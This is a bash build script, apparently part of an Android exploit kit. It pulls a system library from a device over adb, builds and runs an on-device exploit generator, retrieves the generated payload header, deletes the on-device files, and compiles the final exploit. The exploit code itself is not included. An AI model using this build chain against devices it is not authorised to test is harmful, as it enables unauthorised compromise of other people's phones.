#!/bin/bash
rm libs/*
adb pull /system/lib/libcutils.so libs/

echo "Building exploit generator...."
sleep 1

cp Android.mk-exp_gen Android.mk
~/android-ndk-r8c/ndk-build
adb push ../libs/armeabi/exp_gen /data/local/tmp

echo "Starting exploit generation..."
sleep 1

adb shell /data/local/tmp/exp_gen
i=$(adb shell ls /data/local/tmp/install.h)
if [[ "No such" == *"$i"* ]];
then
  echo "Unable to generate the payload!"
  exit 0
fi

adb pull /data/local/tmp/install.h .
adb shell rm /data/local/tmp/exp_gen
adb shell rm /data/local/tmp/install.h

echo "Starting exploit compilation..."
sleep 1

cp Android.mk-install Android.mk
~/android-ndk-r8c/ndk-build
